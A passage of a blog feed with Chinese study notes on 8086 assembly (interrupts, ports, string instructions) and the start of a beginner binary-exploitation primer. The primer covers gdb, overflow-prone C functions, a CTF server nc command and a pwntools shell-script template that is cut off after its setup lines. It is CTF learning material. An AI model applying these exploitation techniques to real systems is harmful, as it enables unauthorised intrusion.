equal</td><td>不等于则转移</td><td>zf=0</td></tr><tr><td>jb</td><td>jump below</td><td>低于则转移</td><td>cf=1</td></tr><tr><td>jnb</td><td>jmp not below</td><td>不低于则转移</td><td>cf=0</td></tr><tr><td>ja</td><td>jump above</td><td>高于则转移</td><td>cf=0且zf=0</td></tr><tr><td>jna</td><td>jump not above</td><td>不高于则转移</td><td>cf=1或zf=1</td></tr><tr><td>jz</td><td>jump zero</td><td>零则转移</td><td>zf=1</td></tr><tr><td>jnz</td><td>jump not zero</td><td>非零则转移</td><td>zf=0</td></tr></tbody></table></div><p>编程统计data段中数值为8的字节的个数，用ax保存统计结果。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">data segment</span><br><span class="line">db 8,11,8,1,8,5,63,38</span><br><span class="line">data ends</span><br><span class="line">code segment</span><br><span class="line">mov ax,data</span><br><span class="line">mov ds,ax</span><br><span class="line">mov bx,0;ds:bx指向第一个字节</span><br><span class="line">mov ax,0;初始化累加器</span><br><span class="line">mov cx,8</span><br><span class="line">s:cmp byte ptr [bx],8;和8进行比较</span><br><span class="line">jne next;如果不相等则转到next，继续循环</span><br><span class="line">inc ax;如果相等将计数加1</span><br><span class="line">next:inc bx</span><br><span class="line">loop s;程序执行后(ax)=3</span><br><span class="line">code ends</span><br></pre></td></tr></table></figure><h2 id="11-10-DF标志和串传送指令"><a href="#11-10-DF标志和串传送指令" class="headerlink" title="11.10 DF标志和串传送指令"></a>11.10 DF标志和串传送指令</h2><p>flag的第10位是DF，方向标志位。在串处理指令中，控制每次操作后si、di的增减。</p><p>df=0    每次操作后si、di递增；</p><p>df=1    每次操作后si、di递减。</p><h3 id="11-10-1-串传送指令"><a href="#11-10-1-串传送指令" class="headerlink" title="11.10.1 串传送指令"></a>11.10.1 串传送指令</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">movsb</span><br></pre></td></tr></table></figure><p>执行movsb指令相当于进行下面操作：</p><ol><li><p>((es)<em>16+(di))=((ds)\</em>16+(si))</p></li><li><p>如果df=0则 (si)=(si)+1;(di)=(di)+1</p><p>如果df=1则 (si)=(si)-1;(di)=(di)-1</p></li></ol><p>movsb的功能是将ds:si指向的内存单元中的字节送入es:di中，然后根据标志寄存器df的值，将si和递增或递减。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">movsw</span><br></pre></td></tr></table></figure><p>movsw的功能是将ds:si指向的内存字单元中的字送入es:di中，然后根据标志寄存器df的值，将si和递增2或递减2。</p><p>movsb和movsw进行的是串传送操作的一个步骤，一般来说，movsb和movsw都和rep配合使用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rep movsb</span><br></pre></td></tr></table></figure><p>用汇编语法来描述就是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">s:movsb</span><br><span class="line">loop s</span><br></pre></td></tr></table></figure><p>rep的作用是根据cx的值，重复执行后面的串传送指令。由于每执行一次movsb指令si和di都会递增或递减后一个或前一个单元，则rep movsb就可以循环实现(cx)个字符的传送。</p><p>由于df位决定着串传送指令执行后si和di改变的方向，所以CPU应该提供相应的指令来对df位进行设置，从而使人能够决定传送的方向。</p><p>8086CPU提供下面两条指令对df位进行设置</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cld指令:将标志寄存器的df位置0</span><br><span class="line">std指令:将标志寄存器的df位置1</span><br></pre></td></tr></table></figure><p>编程，用串传送指令，将data段中的第一个字符串复制到它后面的空间中。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">data segment</span><br><span class="line">db &#x27;Welcome to masm!&#x27;</span><br><span class="line">db 16 dup (0)</span><br><span class="line">data ends</span><br></pre></td></tr></table></figure><p>①传送的原始位置：ds:si    data:0</p><p>②传送的目的位置：es:di    data:10h</p><p>③传送的长度：cx                (cx)=16</p><p>④传送的方向：df                df=1</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mov ax,data</span><br><span class="line">mov ds,ax</span><br><span class="line">mov si,0;ds:si指向data:0</span><br><span class="line">mov es,ax</span><br><span class="line">mov di,16;es:di指向data:0010</span><br><span class="line">mov cx,16</span><br><span class="line">cld;df=0,正向传送</span><br><span class="line">rep movsb</span><br></pre></td></tr></table></figure><h2 id="11-11-pushf和popf"><a href="#11-11-pushf和popf" class="headerlink" title="11.11 pushf和popf"></a>11.11 pushf和popf</h2><p>pushf的功能是将标志寄存器的值压栈，popf是从栈中弹出数据，送入标志寄存器中。</p><h1 id="12-内中断"><a href="#12-内中断" class="headerlink" title="12. 内中断"></a>12. 内中断</h1><p>任何一个通用的CPU，可以在执行完当前正在执行的指令之后，检测到从CPU外部发送过来或内部产生的一种特殊信息，并且可以立即对所接收到的信息进行处理。中断的意思是CPU不再接着(刚执行完的指令)向下执行，而是转去处理这个特殊信息。</p><p>对于8086CPU，当内部有下面的情况发生的时候将产生相应的中断信息：</p><ol><li>除法错误，比如执行div指令产生的除法溢出    0</li><li>单步执行                                                               1</li><li>执行into指令                                                        4</li><li>执行int指令，该指令的格式为int n，指令中的n为字节型立即数，是提供给CPU的中断类型码</li></ol><h2 id="12-1-中断处理程序"><a href="#12-1-中断处理程序" class="headerlink" title="12.1 中断处理程序"></a>12.1 中断处理程序</h2><p>CPU收到中断信息后，应该转去执行该中断信息的处理程序。中断信息中包含有标识中断源的类型码，根据CPU的设计，中断类型码的作用就是用来定位中断处理程序。CPU用8位的中断类型码通过中断向量表找到相应的中断处理程序的入口地址。中断向量表在0000:0000~0000:03FF的1024个单元存放着。在中断向量表中，一个表项占两个字，高地址字存放段地址，低地址字存放偏移地址。</p><h2 id="12-2-中断过程"><a href="#12-2-中断过程" class="headerlink" title="12.2 中断过程"></a>12.2 中断过程</h2><p>用中断类型码找到中断向量，并用它设置CS和IP，这个工作是由CPU的硬件自动完成的。CPU硬件完成这个工作的过程被称为中断过程。</p><p>中断过程：</p><ol><li>(从中断信息中)取得中断类型码N</li><li>标志寄存器的值入栈(因为在中断过程中要改变标志寄存器的值，所以先将其保存在栈中)  pushf</li><li>设置标志寄存器的第8位TF和第9位IF为0  TF=0，IF=0</li><li>CS的内容入栈   push CS</li><li>IP的内容入栈    push IP</li><li>从内存地址为中断类型码<em>4 和中断类型码\</em>4+2 的两个字单元中读取中断处理程序的入口地址设置IP和CS   (IP)=(N*4)，(CS)=(N*4+2)</li></ol><h2 id="12-3-中断处理程序和iret指令"><a href="#12-3-中断处理程序和iret指令" class="headerlink" title="12.3 中断处理程序和iret指令"></a>12.3 中断处理程序和iret指令</h2><p>中断处理程序的编写步骤：</p><ol><li>保存用到的寄存器</li><li>处理中断</li><li>恢复用到的寄存器</li><li>用iret指令返回</li></ol><p>iret指令的功能用汇编语法描述：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pop IP</span><br><span class="line">pop CS</span><br><span class="line">popf</span><br></pre></td></tr></table></figure><p>iret指令执行后，CPU回到执行中断处理程序前的执行点继续执行程序。</p><h2 id="12-4-单步中断"><a href="#12-4-单步中断" class="headerlink" title="12.4 单步中断"></a>12.4 单步中断</h2><p>CPU在执行完一条指令后，如果检测到标志寄存器的TF=1，则产生单步中断，引发中断过程。</p><h1 id="13-int指令"><a href="#13-int指令" class="headerlink" title="13. int指令"></a>13. int指令</h1><p>int n也是内中断的一种。</p><h2 id="13-1-BIOS中断例程"><a href="#13-1-BIOS中断例程" class="headerlink" title="13.1 BIOS中断例程"></a>13.1 BIOS中断例程</h2><p>int 10h中断例程是BIOS提供的中断例程，其中包含了多个和屏幕输出相关的子程序。</p><p>(ah)=2表示调用第10h号中断例程的2号子程序，功能为设置光标位置。</p><p>(ah)=9表示调用第10h号中断例程的9号子程序，功能为在光标位置显示字符，可以提供要显示的字符、颜色属性、页号、字符重复个数作为参数。</p><p>bl中的颜色属性的格式如下：</p><div class="table-container"><table><thead><tr><th>7</th><th>6</th><th>5</th><th>4</th><th>3</th><th>2</th><th>1</th><th>0</th></tr></thead><tbody><tr><td>BL</td><td>R</td><td>G</td><td>B</td><td>I</td><td>R</td><td>G</td><td>B</td></tr><tr><td>闪烁</td><td></td><td>4~6背景</td><td></td><td>高亮</td><td></td><td>0~2前景</td></tr></tbody></table></div><p>编程，在屏幕的5行12列显示3个红底高亮闪烁绿色的’a’。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">assume cs:code</span><br><span class="line">code segment</span><br><span class="line">mov ah,2;置光标</span><br><span class="line">mov bh,0;第0页</span><br><span class="line">mov dh,5;dh中放行号</span><br><span class="line">mov dl,12;dl中放列号</span><br><span class="line">int 10h</span><br><span class="line"></span><br><span class="line">mov ah,9;在光标位置显示字符</span><br><span class="line">mov al,&#x27;a&#x27;;字符</span><br><span class="line">mov bl,11001010b;颜色属性</span><br><span class="line">mov bh,0;第0页</span><br><span class="line">mov cx,3;字符重复个数</span><br><span class="line">int 10h</span><br><span class="line"></span><br><span class="line">mov ax,4c00h</span><br><span class="line">int 21h</span><br><span class="line">code ends</span><br><span class="line">end</span><br></pre></td></tr></table></figure><h2 id="13-2-DOS中断例程"><a href="#13-2-DOS中断例程" class="headerlink" title="13.2 DOS中断例程"></a>13.2 DOS中断例程</h2><p>int 21h中断例程是DOS提供的中断例程，其中包含了DOS提供给程序员在编程时调用的子程序。</p><p>前面一直使用的是int 21h中断例程的4ch号功能，即程序返回功能</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov ah,4ch;程序返回</span><br><span class="line">mov al,0;返回值</span><br><span class="line">int 21h</span><br></pre></td></tr></table></figure><p>(ah)=9表示调用第21h号中断例程的9号子程序，功能为在光标位置显示字符串，可以提供要显示字符串的地址作为参数。</p><p>编程，在屏幕的5行12列显示字符串“Welcome to masm!”</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">assume cs:code,ds:data</span><br><span class="line">data segment</span><br><span class="line">db &#x27;Welcome to masm!&#x27;</span><br><span class="line">data ends</span><br><span class="line">code segment</span><br><span class="line">start:mov ah,2;置光标</span><br><span class="line">mov bh,0;第0页</span><br><span class="line">mov dh,5;dh中放行号</span><br><span class="line">mov dl,12;dl中放列号</span><br><span class="line">int 10h</span><br><span class="line"></span><br><span class="line">mov ax,data</span><br><span class="line">mov ds,ax</span><br><span class="line">mov dx,0;ds:dx指向字符串的首地址data:0</span><br><span class="line">mov ah,9</span><br><span class="line">int 21h</span><br><span class="line"></span><br><span class="line">mov ax,4c00h</span><br><span class="line">int 21h</span><br><span class="line">code ends</span><br><span class="line">end start</span><br></pre></td></tr></table></figure><h1 id="14-端口"><a href="#14-端口" class="headerlink" title="14. 端口"></a>14. 端口</h1><p>在PC机系统中，和CPU通过总线相连的芯片除各种存储器外，还有以下三种芯片</p><ol><li>各种接口卡(网卡、显卡)上的接口芯片，它们控制接口卡进行工作</li><li>主板上的接口芯片，CPU通过它们对部分外设进行访问</li><li>其他芯片，用来存储相关的系统信息，或进行相关的出入输出处理</li></ol><p>从CPU的角度，将寄存器都当作端口，对它们进行统一编址，从而建立了一个统一的端口地址空间。每一个端口在地址空间中都有一个地址。</p><p>CPU可以直接读写以下3个地方的数据：</p><ol><li>CPU内部的寄存器</li><li>内存单元</li><li>端口</li></ol><h2 id="14-1-端口的读写"><a href="#14-1-端口的读写" class="headerlink" title="14.1 端口的读写"></a>14.1 端口的读写</h2><p>因为端口所在的芯片和CPU通过总线相连，所以端口地址和内存地址一样，通过地址总线来传送。在PC系统中，CPU最多可以定位64KB个不同的端口，端口地址的范围为0~65535</p><p>端口的读写指令只有两条：in和out，分别用于从端口读取数据和往端口写入数据。</p><p><strong>访问内存：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mov ax,ds:[8];假设执行前(ds)=0</span><br></pre></td></tr></table></figure><p>①CPU通过地址线将地址信息8发出</p><p>②CPU通过控制线发出内存读命令，选中存储器芯片并通知它将要从中读取数据</p><p>③存储器将8号单元中的数据通过数据线送入CPU</p><p><strong>访问端口：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">in al,60h;从60h号端口读入一个字节</span><br></pre></td></tr></table></figure><p>①CPU通过地址线将地址信息60h发出</p><p>②CPU通过控制线发出端口读命令，选中端口所在的芯片，并通知它将要从中读取数据</p><p>③端口所在的芯片将60h端口中的数据通过数据线送入CPU</p><p>注：在in和out指令中，只能使用ax或al来存放从端口中读入的数据或要发送到端口中的数据。访问8位端口时用al，访问16位时用ax。</p><p>对0~255以内的端口进行读写时：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">in al,20h;从20h端口读入一个字节</span><br><span class="line">out 20h,al;往20h端口写入一个字节</span><br></pre></td></tr></table></figure><p>对256~65535的端口进行读写时，端口号放在dx中：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov dx,3f8h;将端口号3f8h送入dx</span><br><span class="line">in al,dx;从3f8h端口读入一个字节</span><br><span class="line">out dx,al;往3f8h端口写入一个字节</span><br></pre></td></tr></table></figure><h2 id="14-2-shl和shr指令"><a href="#14-2-shl和shr指令" class="headerlink" title="14.2 shl和shr指令"></a>14.2 shl和shr指令</h2><p>shl和shr是逻辑移位指令。</p><p>shl是逻辑左移指令，它的功能为：</p><ul><li>将一个寄存器或内存单元中的数据向左移位</li><li>将最后移出的一位写入CF中</li><li>最低位用0补充</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov al,01001000b</span><br><span class="line">shl al,1;将al中的数据左移一位</span><br></pre></td></tr></table></figure><p>执行后(al)=10010000b，CF=0</p><p>shr是逻辑右移指令：</p><ul><li>将一个寄存器或内存单元中的数据向右移位</li><li>将最后移出的一位写入CF中</li><li>最高位用0补充</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov al,10000001b</span><br><span class="line">shr al,1</span><br></pre></td></tr></table></figure><p>执行后(al)=01000000b，CF=1</p><h2 id="14-3-CMOS-RAM芯片"><a href="#14-3-CMOS-RAM芯片" class="headerlink" title="14.3 CMOS RAM芯片"></a>14.3 CMOS RAM芯片</h2><p>CMOS特征：</p><ol><li>包含一个实时钟和一个有128个存储单元的RAM存储器</li><li>该芯片靠电池供电，关机后其内部的实时钟仍可正常工作，RAM中的信息不丢失</li><li>128个字节的RAM中，内部实时钟占用0~0dh单元来保存时间信息，其余大部分单元用于保存系统配置信息，供系统启动时BIOS程序读取。</li><li>芯片内部有两个端口，端口地址为70h和71h。CPU通过这两个端口读写CMOS</li><li>70h为地址端口，存放要访问的CMOS RAM单元的地址；71h为数据端口，存放从选定的CMOS单元中读取的数据，或要写入到其中的数据。CPU对CMOS的读写分两步进行，读CMOS的2号单元：①将2送入端口70h；②从端口71h读出2号单元的内容</li></ol><p>在CMOS中，存放这当前的时间：年、月、日、时、分、秒。这6个信息的长度都为1个字节。存放单元为：秒：0        分：2        时：4        日：7        月：8        年：9</p><p>这些数据以BCD码的方式存放。BCD码是以4位二进制数表示十进制数码的编码方法。数值26，用BCD码表示为：0010 0110</p><p>1个字节表示2个BCD码，高4位的BCD码表示十位，低4位的BCD码表示个位。</p><p>编程，在屏幕中间显示当前的月份</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">assume cs:code</span><br><span class="line">code segment</span><br><span class="line">start:mov al,8</span><br><span class="line">out 70h,al;从8号单元读出当前月份的BCD码</span><br><span class="line">in al,71h;从数据端口71h中取得指定单元中的数据</span><br><span class="line"></span><br><span class="line">mov ah,al;al中为从CMOS的8号单元中读出的数据</span><br><span class="line">mov cl,4</span><br><span class="line">shr ah,cl;ah中为月份的十位数码值</span><br><span class="line">and al,00001111b;al中为月份的个位数码值</span><br><span class="line"></span><br><span class="line">add ah,30h</span><br><span class="line">add al,30h;显示对应的ASCII码字符</span><br><span class="line"></span><br><span class="line">mov bx,0b800h</span><br><span class="line">mov es,bx</span><br><span class="line">mov byte ptr es:[160*12+40*2],ah;显示月份的十位数码</span><br><span class="line">mov byte ptr es:[160*12+40*2+2],al;显示月份的个位数码</span><br><span class="line"></span><br><span class="line">mov ax,4c00h</span><br><span class="line">int 21h</span><br><span class="line">code ends</span><br><span class="line">end start</span><br></pre></td></tr></table></figure><h1 id="15-外中断"><a href="#15-外中断" class="headerlink" title="15. 外中断"></a>15. 外中断</h1><p>外设输入不直接送入内存和CPU，而是送入相关的接口芯片的端口中；CPU向外设的输出也不是直接送入外设，而是先送入端口中，再由相关芯片送到外设。</p><p>在PC系统中，外中断源一共有以下两类：</p><ol><li>可屏蔽中断</li></ol><p>可屏蔽中断是CPU可以不响应的外中断。CPU是否响应要看标志寄存器的IF位。如果IF=1，CPU在执行完当前指令后响应中断，引发中断过程；如果IF=0，不响应可屏蔽中断。</p><p>8086CPU提供设置IF的指令如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sti;设置IF=1</span><br><span class="line">cli;设置IF=0</span><br></pre></td></tr></table></figure><ol><li>不可屏蔽中断</li></ol><p>不可屏蔽中断是CPU必须响应的外中断。当CPU检测到不可屏蔽中断信息时，则在执行完当前指令后，立即响应，引发中断过程。对于8086CPU，不可屏蔽中断的中断类型码固定为2，所以中断过程中，不需要取中断类型码。则不可屏蔽中断的中断过程为：</p><p>①标志寄存器入栈，IF=0，TF=0</p><p>②CS、IP入栈</p><p>③(IP)=8，(CS)=(0ah)</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;很久之前看王爽老师的《汇编语言》写的笔记，可能不太准确，先做个存档吧。&lt;/p&gt;</summary>
    
    
    
    <category term="Windows逆向" scheme="http://example.com/categories/Windows%E9%80%86%E5%90%91/"/>
    
    
    <category term="汇编" scheme="http://example.com/tags/%E6%B1%87%E7%BC%96/"/>
    
  </entry>
  
  <entry>
    <title>pwn基础入门</title>
    <link href="http://example.com/posts/1c971db4.html"/>
    <id>http://example.com/posts/1c971db4.html</id>
    <published>2022-04-10T06:27:13.698Z</published>
    <updated>2022-04-11T05:24:58.920Z</updated>
    
    <content type="html"><![CDATA[<p>先存个档。</p><span id="more"></span><h1 id="1-Linux入门"><a href="#1-Linux入门" class="headerlink" title="1. Linux入门"></a>1. Linux入门</h1><div class="table-container"><table><thead><tr><th>命令</th><th>含义</th><th>示例</th></tr></thead><tbody><tr><td>pwd</td><td>输出当前路径</td><td>pwd</td></tr><tr><td>ls</td><td>列出位于当前路径的文件</td><td>ls -al</td></tr><tr><td>cd xxx</td><td>改变当前路径，前往xxx目录</td><td>cd ~/workspace</td></tr><tr><td>cat xxx</td><td>直接展示xxx文件的内容</td><td>cat hw.c</td></tr><tr><td><em>*</em> \</td><td>grep xxx</td><td><em>*</em>是其他命令，输出含有xxx的行</td><td>cat hw.c \</td><td>grep stdio.h</td></tr><tr><td><em>*</em> \</td><td>less</td><td>查看输出更舒服，jk上下移动q退出</td><td>cat hw.c \</td><td>less</td></tr><tr><td>./xxx</td><td>运行当前目录xxx可执行文件</td><td>./a.out</td></tr></tbody></table></div><h1 id="2-汇编基础"><a href="#2-汇编基础" class="headerlink" title="2. 汇编基础"></a>2. 汇编基础</h1><p> 内存地址：在有段/偏移寄存器的语境下一般记为<code>段:偏移</code>，如<code>CS:IP</code>,<code>SS:IP</code>,<code>SS:BP</code>,<code>DS:DI</code>,<code>DS:SI</code>,<code>DS:[]</code></p><script type="math/tex; mode=display">一个内存地址=段地址×16+偏移地址\\1234h:ABCDh=12340h+ABCDh=1CF0Dh</script><p>小端序：低地址存放低位数据</p><p>一个程序的内存空间：</p><div class="table-container"><table><thead><tr><th>高地址</th><th style="text-align:center">OS Kernel Space</th></tr></thead><tbody><tr><td></td><td style="text-align:center">Stack</td></tr><tr><td></td><td style="text-align:center">↓(blank)</td></tr><tr><td></td><td style="text-align:center">Shared Libraries</td></tr><tr><td></td><td style="text-align:center">↑(blank)</td></tr><tr><td></td><td style="text-align:center">Heap</td></tr><tr><td></td><td style="text-align:center">BSS</td></tr><tr><td></td><td style="text-align:center">Data(RW)数据段</td></tr><tr><td></td><td style="text-align:center">Text(RX)代码段</td></tr><tr><td>低地址</td><td style="text-align:center">(blank)</td></tr></tbody></table></div><p>栈：</p><div class="table-container"><table><thead><tr><th style="text-align:center">SS:SP 栈顶</th></tr></thead><tbody><tr><td style="text-align:center">SS:BP 栈帧基底</td></tr><tr><td style="text-align:center">SS 栈底</td></tr></tbody></table></div><p>寄存器总结</p><div class="table-container"><table><thead><tr><th>name</th><th>用途</th><th>name</th><th>用途</th></tr></thead><tbody><tr><td>AX</td><td>通常用来存放函数的返回值</td><td>SS(Stack Seg)</td><td>栈的段地址/基地址</td></tr><tr><td>CX</td><td>通常用来做循环计数器</td><td>CS(Code Seg)</td><td>下一条指令的段地址</td></tr><tr><td>BX</td><td></td><td>DS(Data Seg)</td><td>数据的段地址</td></tr><tr><td>DX</td><td></td><td><strong>SP(Stack Pointer)</strong></td><td>栈顶偏移地址</td></tr><tr><td></td><td></td><td><strong>BP(Base Pointer)</strong></td><td>栈的基址偏移地址</td></tr><tr><td></td><td></td><td><strong>IP(Instruction Pointer)</strong></td><td>下一条指令的偏移地址</td></tr></tbody></table></div><p>汇编指令</p><p><img src="F:\markdown图片\pwn知识点\汇编指令.png" alt="汇编指令"></p><h1 id="3-程序装载与栈帧结构"><a href="#3-程序装载与栈帧结构" class="headerlink" title="3. 程序装载与栈帧结构"></a>3. 程序装载与栈帧结构</h1><p>在Linux的可执行文件ELF</p><p>ELF文件类型：</p><ul><li>Relocatable File(*.o)：可重定位文件，用来链接的素材</li><li>Executable File(*)：可执行文件</li><li>Shared Object File(*.so)：共享目标文件，用于做动态链接库</li></ul><h1 id="4-实战环境配置和工具介绍"><a href="#4-实战环境配置和工具介绍" class="headerlink" title="4. 实战环境配置和工具介绍"></a>4. 实战环境配置和工具介绍</h1><p>连接远程服务器：</p><p>nc表示netcat</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc node4.buuoj.cn 28487</span><br></pre></td></tr></table></figure><p>使用file查看文件信息，checksec查看文件保护信息。</p><img src="/posts/1c971db4/checksec.png" class="" title="文件信息"><p>利用gdb调试ELF文件：</p><div class="table-container"><table><thead><tr><th>命令</th><th>简写</th><th>说明</th></tr></thead><tbody><tr><td>file</td><td></td><td>装载一个文件，可以在gdb后加参数，效果等同</td></tr><tr><td>kill</td><td></td><td>终止当前调试的进程</td></tr><tr><td>run</td><td>r</td><td>运行当前装载的文件，运行过程中使用Ctrl + C退出程序交互，进入调试(在退出时位置)</td></tr><tr><td>next</td><td>n</td><td>=step over 单步步过</td></tr><tr><td>step</td><td>s</td><td>=step into 单步步入</td></tr><tr><td>continue</td><td>c</td><td>继续执行程序，直到下一个中断或程序结束</td></tr><tr><td>finish</td><td>fini</td><td>运行到函数返回处</td></tr><tr><td>catch</td><td></td><td>设置捕捉点</td></tr><tr><td>thread</td><td>t</td><td>查看当前程序的线程信息</td></tr><tr><td>break</td><td>b</td><td>在当前位置设置断点</td></tr><tr><td>backtrace</td><td>k</td><td>查看当前函数调用栈信息</td></tr><tr><td>stack</td><td></td><td>stack n 查看栈内容</td></tr><tr><td>vmmap</td><td></td><td>查看程序中的分段，相当于OD中的<code>E</code>模块</td></tr></tbody></table></div><h1 id="5-缓冲区溢出"><a href="#5-缓冲区溢出" class="headerlink" title="5. 缓冲区溢出"></a>5. 缓冲区溢出</h1><p>编写程序时没有考虑或错误设置用户输入长度，导致用户向缓冲区输入长度超过接受变量长度，从而覆盖到其它正常数据，破坏栈帧结构。</p><p>缓冲区溢出常见的漏洞函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> *<span class="title function_">gets</span><span class="params">(<span class="type">char</span> *str)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">read</span><span class="params">(<span class="type">int</span> handle, <span class="type">void</span> *buf, <span class="type">int</span> len)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">scanf</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *format, ...)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">getchar</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">printf</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *<span class="keyword">restrict</span> format, ...)</span>;</span><br></pre></td></tr></table></figure><p>如果文件中有”/bin/sh”，可用以下脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, bits=<span class="number">64</span>)</span><br><span class="line">context.terminal = [<span class="string">&#x27;/usr/bin/x-terminal-emulator&#x27;</span>, <span class="string">&#x27;-e&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># Interface</span></span><br><span class="line">local = <span class="literal">True</span></span><br><span class="line">binary_name = <span class="string">&#x27;filename&#x27;</span></span><br><span class="line">port = <span class="number">12345</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    p = process([<span class="string">&quot;./&quot;</span> + binary_name])</span><br><span class="line">    e = ELF(<span class="string">&#x27;./&#x27;</span> + binary_name)</span><br><span 